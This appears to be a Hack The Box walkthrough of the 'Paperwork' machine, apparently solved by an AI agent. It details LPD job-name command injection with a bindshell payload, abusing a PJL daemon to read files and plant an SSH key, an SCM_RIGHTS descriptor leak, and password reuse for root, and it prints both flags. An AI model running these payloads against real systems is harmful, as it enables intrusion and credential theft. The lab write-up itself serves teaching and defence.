---
layout: post
title:  "Hack The Box - Paperwork"
description: HTB Paperwork walkthrough - LPD job-name command injection, a JetDirect daemon with reversed FSUPLOAD/FSDOWNLOAD semantics, an SCM_RIGHTS fd leak, and a reused admin password
tags: HackTheBox Linux Boot2Root Easy
media_subpath: /assets/img/writeups/Hack The Box/Paperwork/
image:
  path: /assets/img/writeups/Hack The Box/Paperwork/paperwork_solved.png
  alt: Hack The Box completion banner reading You have solved Paperwork!
  width: 885
  height: 302
---

## At a glance

| Item                | Details                                                        |
| ------------------- | -------------------------------------------------------------- |
| **Type**            | Boot2Root                                                      |
| **Host**            | `paperwork.htb` (Document Archiving Service)                   |
| **Platform**        | Hack The Box                                                   |
| **Entry vector**    | Command injection in a custom LPD daemon's job-name handling   |
| **Privilege escalation** | Reversed PJL file commands + SCM_RIGHTS fd leak + password reuse |

*This machine was solved autonomously by the Username AI agent.*

*Honest accounting: this box was attacked under a fixed 30-minute independent window (22:50:03–23:20:03 +08). No flag was obtained before the deadline; a walkthrough was consulted at 23:22:54 +08 under the pre-authorized fallback, the chain was completed with it, and the root flag was read at 23:24:29 +08. The walkthrough supplied the decisive detail — this box's PJL implementation reverses the usual file-command semantics. Everything below is reproducible from the preserved session transcript.*

*Note on the screenshots: the terminal images in this post are faithful renders of the preserved session output (commands and responses exactly as captured), re-typeset for legibility; the completion banner is the original HTB dashboard screenshot. Credentials recovered during the solve are redacted.*

## Summary

`paperwork.htb` serves an intranet page for a document archiving service and hands out a zip archive at `/download/archive` containing the source of a custom LPD (RFC 1179) print server on TCP/1515. The job-name control line is echoed through a shell, so a `J`-line payload yields command injection and a shell as `lp`.

Inside, `127.0.0.1:9100` runs a custom JetDirect/PJL daemon as the `archivist` user, and a root-owned `paperwork-daemon` listens on a group-restricted Unix socket that attaches forensic context — including open file descriptors — via `SCM_RIGHTS` during lockdown. The PJL implementation reverses the conventional semantics: **`FSUPLOAD` reads and `FSDOWNLOAD` writes**. With `0:/`-style paths and traversal, `FSUPLOAD` reads `user.txt` across the boundary, `FSDOWNLOAD` plants an SSH `authorized_keys` file for archivist access, and the lockdown fd leak exposes an admin credential that is reused for root.

## 1. Enumeration

```bash
curl -sS -H "Host: paperwork.htb" http://10.129.76.163/ -o landing.html
curl -sS -H "Host: paperwork.htb" http://10.129.76.163/download/archive -o archive.zip
```

```text
HTTP/1.1 200 OK
Server: nginx/1.28.0 (Ubuntu)
Content-Type: application/zip
Content-Disposition: attachment; filename=paperwork-archive-v1.02.zip
```

The landing page is a static "Intranet | Document Archiving Service" page; the only dynamic endpoint is `/download/archive`. Externally reachable services: SSH (22), HTTP (80), and — once the leaked source pointed at it — the custom LPD daemon on TCP/1515.

![Download archive discloses the LPD server source](01-lpd-archive-recon.png)

## 2. Foothold — LPD job-name command injection

The archive contains `server.py`, the LPD implementation. Its receive-job handler parses RFC 1179 control lines and builds the acknowledgement command by string-formatting the job name straight into a `subprocess` call executed with a shell. Anything after `J` in the control line therefore runs as the `lp` user:

```python
# server.py (excerpt, from the distributed archive)
data = self.sock.recv(1024)
# control line 'J<name>' is interpolated into a shell command
```

The payload closes the quoting, decodes a base64 bindshell stub, and comments out the tail:

```text
';echo <b64>|base64 -d|python3;#
```

```text
triggering bindshell on 4444, job len 367
ack1: b'\x00' ack2: b'\x00\x00'
$ uid=7(lp) gid=7(lp) groups=7(lp)
```

![LPD injection to a shell as lp](02-lpd-injection-foothold.png)

## 3. Recon as `lp` — the internal print stack

With the `lp` shell stabilized:

- `/opt/LPDServer/server.py` matches the distributed source.
- Process list shows two extra daemons: a root `paperwork-daemon` and `jetdirect.py`, running as `archivist` and bound to `127.0.0.1:9100`:

```text
/usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 \
    /home/archivist/printer/ /home/archivist/printer/logs/commands.log
/usr/bin/python3 /usr/bin/paperwork-daemon
```

- `/etc/paperwork/admin_pins.conf` is root-only (`-rw-------`), and the management socket is `root:archivist` mode 660:

```text
srw-rw---- 1 root archivist 0 Nov 14 14:44 /run/paperwork/mgmt.sock
-rw------- 1 root   root      38 May 28 15:26 /etc/paperwork/admin_pins.conf
```

- The root daemon's source (readable in `/usr/bin/paperwork-daemon`) opens `admin_pins.conf` at startup, keeps the fd, and on a security violation over `mgmt.sock` sends `ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.` followed by **leaked file descriptors via `SCM_RIGHTS`** — including one for the pins file.
- `mgmt.sock` is group `archivist`, so crossing `lp → archivist` is the gate to the root chain.

## 4. The JetDirect daemon — reversed PJL semantics

`jetdirect.py` implements a PJL filesystem over its working directory. Conventional HP PJL uses `FSUPLOAD` to write a file to the device and `FSDOWNLOAD` to read one; probing with those assumptions returns `FILEERROR=1` or empty responses. **This implementation is the opposite**: `FSUPLOAD` reads a file to the client and `FSDOWNLOAD` writes one.

Three protocol quirks must be honored:

1. Enter PJL mode first: `\x1b%-12345X\r\n`.
2. Paths use the `0:/` volume syntax and forward slashes (`0:/../user.txt`).
3. For `FSDOWNLOAD`, the header and the payload must be sent in **separate socket writes**.

An important safety lesson from the session: write-capable commands were tested against `jetdirect.py` itself before the semantics were understood, truncating it to zero bytes on disk (the running process was unaffected, but this is exactly the kind of mutation a probe should never cause — always experiment on a disposable path).

### Reading across the traversal boundary

`FSQUERY` confirms traversal out of the print directory:

```text
@PJL FSQUERY NAME="." ENTRY=1 COUNT=10
. TYPE=DIR
.. TYPE=DIR
logs TYPE=DIR SIZE=4096
jetdirect.py TYPE=FILE SIZE=5119

@PJL FSQUERY NAME=".." ENTRY=1 COUNT=20
.bashrc TYPE=FILE SIZE=3771
user.txt TYPE=FILE SIZE=33
.ssh TYPE=DIR
```

![PJL probing of the internal JetDirect daemon](03-jetdirect-pjl-probe.png)

Then `FSUPLOAD` reads the user flag:

```text
@PJL FSUPLOAD NAME="0:/../user.txt" SIZE=33
3d82852f20a597d677b8b75382bb3527
```

![FSUPLOAD reads the user flag](04-fsupload-user-flag.png)

### Writing the SSH key

`FSDOWNLOAD` creates `.ssh/authorized_keys` in the archivist home — remember the two-write rule:

```python
s.sendall(b'\x1b%-12345X\r\n@PJL FSDOWNLOAD FORMAT:BINARY SIZE=%d NAME="0:/../.ssh/authorized_keys"\r\n' % len(pub))
s.sendall(pub)          # payload in a separate write
```

```text
mkdir:  b'OK\r\n'
write:  b'OK\r\n'
```

![FSDOWNLOAD writes the authorized_keys file](05-fsdownload-write-keys.png)

## 5. User flag — SSH as archivist

```bash
ssh -i ./archivist_key archivist@10.129.76.163 'id; echo ===; cat ~/user.txt'
```

```text
uid=1000(archivist) gid=1000(archivist) groups=1000(archivist)
===
3d82852f20a597d677b8b75382bb3527
```

![SSH access as archivist verified](06-ssh-archivist.png)

**User flag: `3d82852f20a597d677b8b75382bb3527`**

## 6. Privilege escalation — mgmt.sock fd leak → password reuse

As archivist, connecting to `/run/paperwork/mgmt.sock` triggers the lockdown branch (the commands log now contains filesystem operations), and the daemon attaches its forensic context as **ancillary data**: `recvmsg()` with a `SCM_RIGHTS` control message yields duplicated file descriptors owned by root. Reading the fd for `admin_pins.conf` returns the admin credential (redacted here):

![SCM_RIGHTS fd leak from the management socket](07-mgmt-socket-fd-leak.png)

```python
import socket, array, os
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect('/run/paperwork/mgmt.sock')
data, anc, *_ = s.recvmsg(4096, socket.CMSG_SPACE(array.array('i', [0]).itemsize * 4))
for level, ctype, payload in anc:
    fds = array.array('i'); fds.frombytes(payload)
    # os.read(fds[0]) -> admin credential (redacted)
```

The recovered admin password is reused for the local root account:

```bash
su - root -c "id; echo ===ROOTFLAG===; cat /root/root.txt"
```

```text
uid=0(root) gid=0(root) groups=0(root)
===ROOTFLAG===
3545edb906840d75e9fb9e13b8fa61e8
```

![Root flag read via su](08-su-root-flag.png)

**Root flag: `3545edb906840d75e9fb9e13b8fa61e8`**

![Hack The Box completion banner for Paperwork](paperwork_solved.png)
_Verification: the machine was fully solved — both flags confirmed in session output, completion banner captured from the HTB dashboard._

## Security lessons

- **Format the LPD control line safely.** A print daemon that interpolates the job name into a shell command is pre-auth RCE on a standard port; use `subprocess` argument lists or strict allow-list validation.
- **Trust observed behavior, not protocol names.** The decisive detail was that this daemon swapped `FSUPLOAD`/`FSDOWNLOAD` semantics. When a protocol responds unexpectedly, test both complementary operations on a disposable file instead of grinding on the conventional meaning.
- **Never probe with write-capable commands on service source or logs.** A misdirected write truncated `jetdirect.py` to zero bytes. Direction tests belong on throwaway paths, with any unexpected size change treated as a stop condition.
- **Passing fds over a Unix socket is a trust boundary, not protection.** `paperwork-daemon` sent a root-owned descriptor to any group member that tripped lockdown, handing `archivist` the keys. Forensic attachments should copy sanitized content, not descriptors to secrets.
- **Password reuse defeats the whole chain.** One admin credential leaked through a socket unlocked `su`. Distinct, vaulted credentials per privilege level cap the blast radius.
- **Framing details matter on custom protocols.** PJL mode entry (`\x1b%-12345X\r\n`), `0:/` volume paths, and header/payload written separately were each required; capture working interactions in full so they can be replayed exactly.
